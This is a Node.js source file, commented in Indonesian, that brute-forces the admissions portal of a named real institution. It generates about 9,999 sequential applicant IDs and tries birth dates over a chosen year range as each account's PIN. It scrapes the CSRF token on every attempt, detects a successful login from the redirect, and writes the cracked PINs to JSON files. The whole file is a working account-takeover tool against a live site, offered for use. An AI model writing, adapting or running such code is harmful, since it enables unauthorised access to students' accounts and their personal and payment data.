const fs = require("fs");
const path = require("path");
const axios = require("axios");
const { wrapper } = require("axios-cookiejar-support");
const { CookieJar } = require("tough-cookie");
const { emitter, setStopped } = require("./state");

// Fungsi delay / proses async yang lama (contoh pakai Promise)
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const BASE_URL = "https://pmb.poliban.ac.id";
const UA =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
  "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
const jobs = {};

function createClient() {
  const jar = new CookieJar();
  const client = wrapper(
    axios.create({
      jar,
      withCredentials: true,
      baseURL: BASE_URL,
      timeout: 0,
      maxRedirects: 99999,
      headers: { "User-Agent": UA },
      validateStatus: (s) => s >= 200 && s < 500,
    }),
  );
  return { client, jar };
}

let countError = 0;

async function main(nomor, startsss, endsss, account) {
  const accounts = account;
  setStopped(false); // Reset status berhenti sebelum memulai pekerjaan baru

  jobs[nomor] = {
    statusData: {},
    start: 0,
    starts: Date.now(),
    next: "",
    prev: "",
    timePrev: 0,
    count: 0,
    total: accounts.length,
    sisa: accounts.length,
    coba: 0,
    data: [],
  };

  const job = jobs[nomor];

  for (let i = 0; i < accounts.length; i++) {
    const acc = accounts[i];

    job.prev = accounts[i - 1]?.id ?? "Tidak Ada";
    job.next = accounts[i + 1]?.id ?? "Tidak Ada";
    job.start = Date.now();

    const pin = await login(
      acc.id,
      acc.nama,
      startsss,
      endsss,
      nomor, // kirim nomor ke login
    );
    if (pin === "dihentikan") {
      console.log("job:", job);
      console.log("jobs:", jobs);
      jobs.length = 0; // Reset jobs array
      Object.keys(job).forEach((key) => {
        delete job[key];
      });
      console.log("job after reset:", job);
      console.log("jobs after reset:", jobs);
      break; // Keluar dari loop jika proses dihentikan
    }

    job.count++;
    job.sisa = job.total - job.count;

    job.data.push({
      nomor,
      nama: acc.nama,
      id: acc.id,
      pin,
    });

    fs.writeFileSync(
      path.join(__dirname, `data${nomor}.json`),
      JSON.stringify(job.data, null, 2),
      "utf8",
    );

    job.timePrev = Date.now() - job.start;
  }
  if (!emitter.listenerCount("stop") && !global.shouldStop) {
    console.log(`Selesai ${job.total} akun`);
  } else {
    setStopped(false); // Reset status berhenti setelah proses dihentikan
    global.shouldStop = false; // Reset global flag
    console.log(
      `Proses dihentikan oleh pengguna. ${job.count} akun telah diproses.`,
    );
    return;
  }
}

function loadAccounts() {
  /*const file = "./accounts.json";
  if (fs.existsSync(file)) {
    const arr = JSON.parse(fs.readFileSync(file, "utf8"));
    if (!Array.isArray(arr)) throw new Error("accounts.json harus berupa array");
    return arr;
    }*/
  const idd = generateSequence("2506");
  return idd;
}

function generateSequence(prefix) {
  const result = [];

  // Looping dari 1 sampai 9999
  for (let i = 1; i <= 9999; i++) {
    // Mengubah angka menjadi string dan menambahkan '0' di depan hingga panjangnya 4 karakter
    const suffix = String(i).padStart(4, "0");
    result.push({
      id: `${prefix}${suffix}`,
      nama: `Nama ${suffix}`,
    });
  }

  return result;
}

async function login(idpendaftar, nama, startss, endss, nomor) {
  const job = jobs[nomor];
  let { client, jar } = createClient();
  const g = gen(startss, endss);
  let pin = g.next();
  try {
    while (true) {
      if (emitter.listenerCount("stop") && global.shouldStop) {
        console.log("Proses dihentikan oleh pengguna.");
        //setStopped(false); // Reset status berhenti setelah proses dihentikan
        jar.removeAllCookiesSync();
        g.reset();
        job.coba = 0;
        return "dihentikan";
      }
      job.coba++;
      const { data: html } = await client.get("/login");
      const tokenMatch = html.match(/name="_token"\s+value="([^"]+)"/);
      if (!tokenMatch) {
        //console.log('CSRF token tidak ditemukan di halaman login');
        jar.removeAllCookiesSync();
        g.reset();
        job.coba = 0;
        ({ client, jar } = createClient());
        return "Err Token";
        //return login(idpendaftar, nama, startss, endss, nomor);
      }
      let token = tokenMatch[1];
      job.statusData = {
        token,
        nama,
        nomor,
        id: idpendaftar,
        tryPin: pin,
        total: job.total,
        count: `${job.count}/${job.total}`,
        berhasil: job.data.filter((d) => d.pin.length === 8).length,
        gagal: job.data.filter((d) => d.pin.length !== 8).length,
        sisa: job.sisa,
        err: countError,
        coba: job.coba,
        waktuPrev: `Waktu: ${fmt(job.timePrev)} | Prev ID: ${job.prev}`,
        waktuNext: `Waktu: ${fmt(Date.now() - job.start)} | Next ID: ${job.next}`,
        running: fmt(Date.now() - job.starts),
        status: 200,
      };
      const body = new URLSearchParams({
        idpendaftar,
        pin,
        act: "login",
        _token: token,
      });

      const res = await client.post("/login", body.toString(), {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Referer: `${BASE_URL}/login`,
          Origin: BASE_URL,
        },
      });
      job.statusData.status = res.status;
      if (res.status !== 200) {
        job.statusData.html = res.data;
        g.reset();
        jar.removeAllCookiesSync();
        job.coba = 0;
        ({ client, jar } = createClient());
        return `Kode ${res.status}`;
      }

      const finalUrl = res.request?.res?.responseUrl ?? res.config.url;
      if (finalUrl.includes("/login")) {
        //console.log(`PIN ${pin} salah.. Skip..`);
        pin = g.next();
        if (pin === null) {
          console.log(
            "Sudah mencoba semua kombinasi tanggal, tidak ada yang cocok. Skipped..",
          );
          g.reset();
          job.coba = 0;
          jar.removeAllCookiesSync();
          return "Tidak Ada";
        }
      } else if (finalUrl.includes("pembayaran")) {
        job.coba = 0;
        job.timePrev = Date.now() - job.start;
        g.reset();
        jar.removeAllCookiesSync();
        return "Pembayaran Belum Lunas Dengan PIN: " + pin;
      } else {
        job.coba = 0;
        job.timePrev = Date.now() - job.start;
        g.reset();
        jar.removeAllCookiesSync();
        return pin;
      }
    }
  } catch (err) {
    console.error(err);
    saveError(err);
    jar.removeAllCookiesSync();
    g.reset();
    job.coba = 0;
    login(idpendaftar, nama, startss, endss, nomor);
    return "Error";
  }
}

function gen(start, end) {
  function parseDate(str) {
    const [dd, mm, yyyy] = str.split("/").map(Number);
    return new Date(yyyy, mm - 1, dd);
  }

  const startDate = parseDate(start);
  const endDate = parseDate(end);

  let current = new Date(startDate);

  function format(d) {
    const dd = String(d.getDate()).padStart(2, "0");
    const mm = String(d.getMonth() + 1).padStart(2, "0");
    const yyyy = d.getFullYear();
    return `${dd}${mm}${yyyy}`;
  }

  function next() {
    if (current > endDate) return null;

    const result = format(current);
    current.setDate(current.getDate() + 1);
    return result;
  }

  function reset() {
    current = new Date(startDate);
  }

  return { next, reset };
}

function fmt(ms) {
  const totalSec = Math.max(0, Math.floor(ms / 1000));

  const d = Math.floor(totalSec / 86400);
  const h = Math.floor((totalSec % 86400) / 3600);
  const m = Math.floor((totalSec % 3600) / 60);
  const s = totalSec % 60;

  const time = `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;

  if (time.includes("NaN")) {
    return "Tidak Ada";
  }

  if (d > 0) {
    return `${d} hari ${time}`;
  }

  return time;
}

const errorBuffer = [];
let saveTimer = null;

function saveError(err) {
  countError++;

  let data;

  if (typeof err?.toJSON === "function") {
    // AxiosError
    data = err.toJSON();
  } else if (err instanceof Error) {
    // Error biasa
    data = {
      name: err.name,
      message: err.message,
      stack: err.stack,
    };
  } else if (typeof err === "object" && err !== null) {
    // Object biasa
    data = err;
  } else {
    // String, number, boolean, dll.
    data = {
      value: err,
    };
  }

  errorBuffer.push({
    waktu: new Date().toISOString(),
    ...data,
  });

  if (saveTimer) return;

  saveTimer = setTimeout(() => {
    const filePath = path.join(__dirname, "axios-errors.json");

    let logs = [];

    if (fs.existsSync(filePath)) {
      try {
        logs = JSON.parse(fs.readFileSync(filePath, "utf8"));
      } catch {
        logs = [];
      }
    }

    logs.push(...errorBuffer);
    errorBuffer.length = 0;

    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    fs.writeFileSync(filePath, JSON.stringify(logs, null, 2), "utf8");

    saveTimer = null;
  }, 5000);
}

process.on("uncaughtException", (err) => {
  saveError(err);
  // Tidak process.exit()
});

process.on("unhandledRejection", (err) => {
  saveError(err);
  // Tidak process.exit()
});

module.exports = { main, jobs };

/*main(1, "01/01/2006", "31/12/2008");
main(2, "01/01/2009", "31/12/2009");
setInterval(() => {
  console.log(jobs[1].statusData);
  console.log(jobs[2].statusData);
}, 5000);*/
